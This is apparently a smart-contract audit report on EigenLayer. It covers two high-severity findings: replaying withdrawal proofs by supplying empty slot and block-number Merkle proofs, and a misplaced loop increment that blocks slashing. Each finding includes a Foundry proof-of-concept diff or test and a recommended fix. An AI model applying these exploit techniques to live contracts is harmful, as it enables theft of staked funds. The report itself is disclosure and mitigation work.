[H-01] Slot and block number proofs not required for verification of withdrawal (multiple withdrawals possible)
Submitted by0xTheC0der, also found bywindowhan001andvolodya
Since this is a vulnerability that involves multiple in-scope contracts and leads to more than one impact, let’s start with a bug description from bottom to top.
LibraryMerkle
The methodsverifyInclusionSha256(proof, root, leaf, index)andverifyInclusionKeccak(proof, root, leaf, index)willalwaysreturntrueifproof.length < 32(e.g. empty proof)andleaf == root. Although this might be intended behaviour, I see no use case for empty proofs and wouldrequirenon-empty proofs at the library level. As of now, the user of the library isresponsibleto enforce non-zero proofs.
LibraryBeaconChainProofs
The methodverifyWithdrawalProofs(beaconStateRoot, proofs, withdrawalFields), which relies on multiple calls toMerkle.verifyInclusionSha256(proof, root, leaf, index), does notrequirea minimum length ofproofs.slotProofandproofs.blockNumberProof. As a consequence, considering a valid set of(beaconStateRoot, proofs, withdrawalFields), the method will still succeed withemptyslot and block number proofs, i.e. theproofscan be modified in the following way:
proofs.slotProof=bytes("");// empty slot proofproofs.slotRoot=proofs.blockHeaderRoot;// make leaf == rootproofs.blockNumberProof=bytes("");// empty block number proofproofs.blockNumberRoot=proofs.executionPayloadRoot;// make leaf == root
As a consequence, we can take a perfectly valid withdrawal proof and re-create the proof for the same withdrawal with adifferentslot and block number (according to the code above) that will still be accepted by theverifyWithdrawalProofs(beaconStateRoot, proofs, withdrawalFields)method.
ContractEigenPod
The methodverifyAndProcessWithdrawal(withdrawalProofs, …), which relies on a call toBeaconChainProofs.verifyWithdrawalProofs(beaconStateRoot, proofs, withdrawalFields), is impacted by a modified - but still valid - withdrawal proof in two ways.
First, the modifierproofIsForValidBlockNumber(Endian.fromLittleEndianUint64(withdrawalProofs.blockNumberRoot))makes sure that theblock numberbeing proven is greater/newer than themostRecentWithdrawalBlockNumber. In our case,blockNumberRoot = executionPayloadRootand depending on the actual value ofexecutionPayloadRoot, theproofIsForValidBlockNumbercan be bypassed as shown in the test, see any PoC test case. As a consequence, old withdrawal proofs could be re-used with an emptyblockNumberProofto withdraw the same funds more than once.
Second, the sub-method_processPartialWithdrawal(withdrawalHappenedSlot, …)requires that aslotis only used once. In our case,slotRoot = blockHeaderRootleads to adifferent slotthan suggested by the original proof. Therefore, a withdrawal proof can be re-used with an emptyslotProofto do the same partial withdrawal twice, see PoC. Depending on the actual value ofblockHeaderRoot, a full withdrawal, instead of a partial withdrawal, will be done according to thecondition in L354.
Insufficient validation of proofs allows multiple withdrawals, i.e. theft of funds.
Proof of Concept
The changes to theEigenPodtest cases below demonstrate the following outcomes:testFullWithdrawalProof:BeaconChainProofs.verifyWithdrawalProofs(beaconStateRoot, proofs, withdrawalFields)still succeeds on empty slot and block number proofs.testFullWithdrawalFlow:EigenPod.verifyAndProcessWithdrawal(withdrawalProofs, …)allows full withdrawal with empty slot and block number proofs.testPartialWithdrawalFlow:EigenPod.verifyAndProcessWithdrawal(withdrawalProofs, …)allows partial withdrawal with empty slot and block number proofs.testProvingMultipleWithdrawalsForSameSlot:EigenPod.verifyAndProcessWithdrawal(withdrawalProofs, …)allows partial withdrawal of the same funds twice due to differentslotRootin original and modified proof.
TheproofIsForValidBlockNumber(Endian.fromLittleEndianUint64(withdrawalProofs.blockNumberRoot))modifier is bypassed (seeblockNumberRoot) in the latter three of the above test cases.
Apply the followingdiffto yoursrc/test/EigenPod.t.soland run the tests withforge test --match-contract EigenPod:
diff --git a/src/test/EigenPod.t.sol b/src/test/EigenPod.t.solindex 31e6a58..5242def 100644--- a/src/test/EigenPod.t.sol+++ b/src/test/EigenPod.t.sol@@ -260,7 +260,7 @@ contract EigenPodTests is ProofParsing, EigenPodPausingConstants {function testFullWithdrawalProof() public {setJSON("./src/test/test-data/fullWithdrawalProof.json");-        BeaconChainProofs.WithdrawalProofs memory proofs = _getWithdrawalProof();+        BeaconChainProofs.WithdrawalProofs memory proofs = _getWithdrawalProof(SKIP_SLOT_BLOCK_PROOF);withdrawalFields = getWithdrawalFields();validatorFields = getValidatorFields();@@ -281,7 +281,7 @@ contract EigenPodTests is ProofParsing, EigenPodPausingConstants {// ./solidityProofGen "WithdrawalFieldsProof" 61336 2262 "data/slot_43222/oracle_capella_beacon_state_43300.ssz" "data/slot_43222/capella_block_header_43222.json" "data/slot_43222/capella_block_43222.json" fullWithdrawalProof.jsonsetJSON("./src/test/test-data/fullWithdrawalProof.json");-        BeaconChainProofs.WithdrawalProofs memory withdrawalProofs = _getWithdrawalProof();+        BeaconChainProofs.WithdrawalProofs memory withdrawalProofs = _getWithdrawalProof(SKIP_SLOT_BLOCK_PROOF);bytes memory validatorFieldsProof = abi.encodePacked(getValidatorProof());withdrawalFields = getWithdrawalFields();validatorFields = getValidatorFields();@@ -317,7 +317,7 @@ contract EigenPodTests is ProofParsing, EigenPodPausingConstants {//generate partialWithdrawalProofs.json with:// ./solidityProofGen "WithdrawalFieldsProof" 61068 656 "data/slot_58000/oracle_capella_beacon_state_58100.ssz" "data/slot_58000/capella_block_header_58000.json" "data/slot_58000/capella_block_58000.json" "partialWithdrawalProof.json"setJSON("./src/test/test-data/partialWithdrawalProof.json");-        BeaconChainProofs.WithdrawalProofs memory withdrawalProofs = _getWithdrawalProof();+        BeaconChainProofs.WithdrawalProofs memory withdrawalProofs = _getWithdrawalProof(SKIP_SLOT_BLOCK_PROOF);bytes memory validatorFieldsProof = abi.encodePacked(getValidatorProof());withdrawalFields = getWithdrawalFields();@@ -346,21 +346,22 @@ contract EigenPodTests is ProofParsing, EigenPodPausingConstants {/// @notice verifies that multiple partial withdrawals can be made before a full withdrawalfunction testProvingMultipleWithdrawalsForSameSlot(/*uint256 numPartialWithdrawals*/) public {-        IEigenPod newPod = testPartialWithdrawalFlow();+        IEigenPod newPod = testPartialWithdrawalFlow(); // uses SKIP_SLOT_BLOCK_PROOF-        BeaconChainProofs.WithdrawalProofs memory withdrawalProofs = _getWithdrawalProof();+        BeaconChainProofs.WithdrawalProofs memory withdrawalProofs = _getWithdrawalProof(FULL_PROOF);bytes memory validatorFieldsProof = abi.encodePacked(getValidatorProof());withdrawalFields = getWithdrawalFields();validatorFields = getValidatorFields();-        cheats.expectRevert(bytes("EigenPod._processPartialWithdrawal: partial withdrawal has already been proven for this slot"));+        // do not expect revert anymore due to different 'slotRoot' on FULL_PROOF and SKIP_SLOT_BLOCK_PROOF+        //cheats.expectRevert(bytes("EigenPod._processPartialWithdrawal: partial withdrawal has already been proven for this slot"));newPod.verifyAndProcessWithdrawal(withdrawalProofs, validatorFieldsProof, validatorFields, withdrawalFields, 0, 0);}/// @notice verifies that multiple full withdrawals for a single validator failfunction testDoubleFullWithdrawal() public {-        IEigenPod newPod = testFullWithdrawalFlow();-        BeaconChainProofs.WithdrawalProofs memory withdrawalProofs = _getWithdrawalProof();+        IEigenPod newPod = testFullWithdrawalFlow(); // uses SKIP_SLOT_BLOCK_PROOF+        BeaconChainProofs.WithdrawalProofs memory withdrawalProofs = _getWithdrawalProof(FULL_PROOF);bytes memory validatorFieldsProof = abi.encodePacked(getValidatorProof());withdrawalFields = getWithdrawalFields();validatorFields = getValidatorFields();@@ -759,8 +760,11 @@ contract EigenPodTests is ProofParsing, EigenPodPausingConstants {return proofs;}+    uint256 internal constant FULL_PROOF = 0;+    uint256 internal constant SKIP_SLOT_BLOCK_PROOF = 1;+/// @notice this function just generates a valid proof so that we can test other functionalities of the withdrawal flow-    function _getWithdrawalProof() internal returns(BeaconChainProofs.WithdrawalProofs memory) {+    function _getWithdrawalProof(uint256 proofType) internal returns(BeaconChainProofs.WithdrawalProofs memory) {//make initial depositcheats.startPrank(podOwner);eigenPodManager.stake{value: stakeAmount}(pubkey, signature, depositDataRoot);@@ -773,9 +777,9 @@ contract EigenPodTests is ProofParsing, EigenPodPausingConstants {beaconChainOracle.setBeaconChainStateRoot(beaconStateRoot);bytes32 blockHeaderRoot = getBlockHeaderRoot();bytes32 blockBodyRoot = getBlockBodyRoot();-            bytes32 slotRoot = getSlotRoot();-            bytes32 blockNumberRoot = getBlockNumberRoot();+            bytes32 slotRoot = (proofType == FULL_PROOF) ? getSlotRoot() : blockHeaderRoot; // else SKIP_SLOT_BLOCK_PROOFbytes32 executionPayloadRoot = getExecutionPayloadRoot();+            bytes32 blockNumberRoot = (proofType == FULL_PROOF) ? getBlockNumberRoot() :  executionPayloadRoot; // else SKIP_SLOT_BLOCK_PROOF@@ -786,9 +790,9 @@ contract EigenPodTests is ProofParsing, EigenPodPausingConstants {BeaconChainProofs.WithdrawalProofs memory proofs = BeaconChainProofs.WithdrawalProofs(abi.encodePacked(getBlockHeaderProof()),abi.encodePacked(getWithdrawalProof()),-                abi.encodePacked(getSlotProof()),+                (proofType == FULL_PROOF) ? abi.encodePacked(getSlotProof()) : bytes(""), // else SKIP_SLOT_BLOCK_PROOFabi.encodePacked(getExecutionPayloadProof()),-                abi.encodePacked(getBlockNumberProof()),+                (proofType == FULL_PROOF) ? abi.encodePacked(getBlockNumberProof()) : bytes(""), // else SKIP_SLOT_BLOCK_PROOFuint64(blockHeaderRootIndex),uint64(withdrawalIndex),blockHeaderRoot,
We can see thatallthe test cases are still passing, whereby the following ones are confirming the aforementioned outcomes:
[PASS] testFullWithdrawalFlow():(address) (gas: 28517915)[PASS] testFullWithdrawalProof() (gas: 13185538)[PASS] testPartialWithdrawalFlow():(address) (gas: 28679149)[PASS] testProvingMultipleWithdrawalsForSameSlot() (gas: 45502286)
Tools Used
VS Code, Foundry
Recommended Mitigation Steps
Require a minimum length (tree height) for the slot and block number proofs inBeaconChainProofs.verifyWithdrawalProofs(beaconStateRoot, proofs, withdrawalFields).
At least require non-empty proofs according to the followingdiff:
diff --git a/src/contracts/libraries/BeaconChainProofs.sol b/src/contracts/libraries/BeaconChainProofs.solindex b4129bf..119baf2 100644--- a/src/contracts/libraries/BeaconChainProofs.sol+++ b/src/contracts/libraries/BeaconChainProofs.sol@@ -259,6 +259,10 @@ library BeaconChainProofs {"BeaconChainProofs.verifyWithdrawalProofs: withdrawalProof has incorrect length");require(proofs.executionPayloadProof.length == 32 * (BEACON_BLOCK_HEADER_FIELD_TREE_HEIGHT + BEACON_BLOCK_BODY_FIELD_TREE_HEIGHT),"BeaconChainProofs.verifyWithdrawalProofs: executionPayloadProof has incorrect length");+        require(proofs.slotProof.length >= 32,+            "BeaconChainProofs.verifyWithdrawalProofs: slotProof has incorrect length");+        require(proofs.blockNumberProof.length >= 32,+            "BeaconChainProofs.verifyWithdrawalProofs: blockNumberProof has incorrect length");/*** Computes the block_header_index relative to the beaconStateRoot.  It concatenates the indexes of all the
Alternative: Non-empty proofs can also be required in theMerklelibrary.
Assessed type
Invalid Validation
sorrynotsorry (lookout) commented:
Well demonstrated with referrable code snippets, hyperlinks, and coded POC.
Marking as HQ.
Sidu28 (EigenLayer) confirmed
Alex the Entreprenerd (judge) commented:
The Warden has shown how, due to a lack of length check, an empty proof could be provided; which would pass validation.This is an example of how a lack of a check can be chained into a proper exploit, and because the proof will pass, funds can be stolen.For these reasons I agree with High Severity.

[H-02] It is impossible to slash queued withdrawals that contain a malicious strategy due to a misplacement of the ++i increment
Submitted byjuancito, also found byyjrwkk,pontifex,evmboi32,bin2chen,sashik_eth,Ruhum,MiloTruck,SpicyMeatball, andvolodya.
StrategyManager::slashQueuedWithdrawal()contains anindicesToSkipparameter to skip malicious strategies, as documented in thefunction definition:
so that, e.g., if the slashedQueuedWithdrawalcontains a malicious strategy in thestrategiesarray which always reverts on calls to its ‘withdraw’ function, then the malicious strategy can be skipped (with the shares in effect “burned”), while the non-malicious strategies are still called as normal.
The problem is, the function does not work as expected, andindicesToSkipis ignored. If the queued withdrawal contains a malicious strategy, it will make the slash always revert.
Owners won’t be able to slash queued withdrawals that contain a malicious strategy.
An adversary can take advantage of this and create withdrawal queues that won’t be able to be slashed, completely defeating the slash system. The adversary can later complete the withdrawal.
Proof of Concept
The++i;statement inStrategyManager::slashQueuedWithdrawal()is misplaced. It is only executed on theelsestatement:
// keeps track of the index in the `indicesToSkip` arrayuint256indicesToSkipIndex=0;uint256strategiesLength=queuedWithdrawal.strategies.length;for(uint256i=0;i<strategiesLength;) {// check if the index i matches one of the indices specified in the `indicesToSkip` arrayif(indicesToSkipIndex<indicesToSkip.length&&indicesToSkip[indicesToSkipIndex] ==i) {unchecked{++indicesToSkipIndex;}}else{if(queuedWithdrawal.strategies[i] ==beaconChainETHStrategy){//withdraw the beaconChainETH to the recipient_withdrawBeaconChainETH(queuedWithdrawal.depositor,recipient,queuedWithdrawal.shares[i]);}else{// tell the strategy to send the appropriate amount of funds to the recipientqueuedWithdrawal.strategies[i].withdraw(recipient,tokens[i],queuedWithdrawal.shares[i]);}unchecked{++i;// @audit}}}
Link to code
Let’s suppose that the owner tries to slash a queued withdrawal, and wants to skip the first strategy (index0) because it is malicious and makes the whole transaction revert.
1 . It definesindicesToSkipIndex = 0.2 . It enters theforloop starting ati = 0.3 .if (indicesToSkipIndex < indicesToSkip.length && indicesToSkip[indicesToSkipIndex] == i)will be true:0 < 1 && 0 == 0.4 . It increments++indicesToSkipIndex;to “skip” the malicious strategy, so nowindicesToSkipIndex = 1.5 . It goes back to theforloop. Butihasn’t been modified, so stilli = 0.6 .if (indicesToSkipIndex < indicesToSkip.length && indicesToSkip[indicesToSkipIndex] == i)will be false now:1 < 1 && 0 == 0.7 . It will enter theelsestatement and attempt to slash the strategy anyway.8 . If the strategy is malicious, it will revert, making it impossible to slash.9 . The adversary can later complete the withdrawal.
POC Test
This test shows how theindicesToSkipparameter is completely ignored.
For the sake of simplicity of the test, it uses a normal strategy; which will be slashed, proving that it ignores theindicesToSkipparameter and it indeed callsqueuedWithdrawal.strategies[i].withdraw().
A malicious strategy that makeswithdraw()revert, would be to make the whole transaction revert (not shown on this test but easily checkable as thefunction won’t catch it).
Add this test tosrc/tests/StrategyManagerUnit.t.soland runforge test -m "testSlashQueuedWithdrawal_IgnoresIndicesToSkip".
functiontestSlashQueuedWithdrawal_IgnoresIndicesToSkip()external{addressrecipient=address(this);uint256depositAmount=1e18;uint256withdrawalAmount=depositAmount;boolundelegateIfPossible=false;// Deposit into strategy and queue a withdrawal(IStrategyManager.QueuedWithdrawalmemoryqueuedWithdrawal,,) =testQueueWithdrawal_ToSelf_NotBeaconChainETH(depositAmount,withdrawalAmount,undelegateIfPossible);// Slash the delegatedOperatorslasherMock.freezeOperator(queuedWithdrawal.delegatedAddress);// Keep track of the balance before the slash attemptuint256balanceBefore=dummyToken.balanceOf(address(recipient));// Assert that the strategies array only has one elementassertEq(queuedWithdrawal.strategies.length,1);// Set `indicesToSkip` so that it should ignore the only strategy// As it's the only element, its index is `0`uint256[]memoryindicesToSkip=newuint256[](1);indicesToSkip[0] =0;// Call `slashQueuedWithdrawal()`// This should not try to slash the only strategy the queue has, because of the defined `indicesToSkip`// But in fact it ignores `indicesToSkip` and attempts to do it anywaycheats.startPrank(strategyManager.owner());strategyManager.slashQueuedWithdrawal(recipient,queuedWithdrawal,_arrayWithJustDummyToken(),indicesToSkip);cheats.stopPrank();uint256balanceAfter=dummyToken.balanceOf(address(recipient));// The `indicesToSkip` was completely ignored, and the function attempted the slash anyway// It can be asserted due to the fact that it increased the balancerequire(balanceAfter==balanceBefore+withdrawalAmount,"balanceAfter != balanceBefore + withdrawalAmount");}
Recommended Mitigation Steps
Place the++ioutside of the if/else statement. This way, it will increment each time the loop runs.
for (uint256 i = 0; i < strategiesLength;) {// check if the index i matches one of the indices specified in the `indicesToSkip` arrayif (indicesToSkipIndex < indicesToSkip.length && indicesToSkip[indicesToSkipIndex] == i) {unchecked {++indicesToSkipIndex;}} else {if (queuedWithdrawal.strategies[i] == beaconChainETHStrategy){//withdraw the beaconChainETH to the recipient_withdrawBeaconChainETH(queuedWithdrawal.depositor, recipient, queuedWithdrawal.shares[i]);} else {// tell the strategy to send the appropriate amount of funds to the recipientqueuedWithdrawal.strategies[i].withdraw(recipient, tokens[i], queuedWithdrawal.shares[i]);}-           unchecked {-               ++i;-           }}+       unchecked {+           ++i;+       }}
Assessed type
Loop
sorrynotsorry (lookout) commented:
The issue is well demonstrated, properly formatted, and contains a coded POC.
Marking as HQ.
Sidu28 (EigenLayer) confirmed
Alex the Entreprenerd (judge) commented:
The Warden has shown how, due to incorrect placement of the loop increment, malicious strategies cannot be skipped when slashing queued withdrawals.Because this breaks a core functionality of the contracts, which will also cause a loss of funds, I agree with High Severity.Mitigation is straightforward.

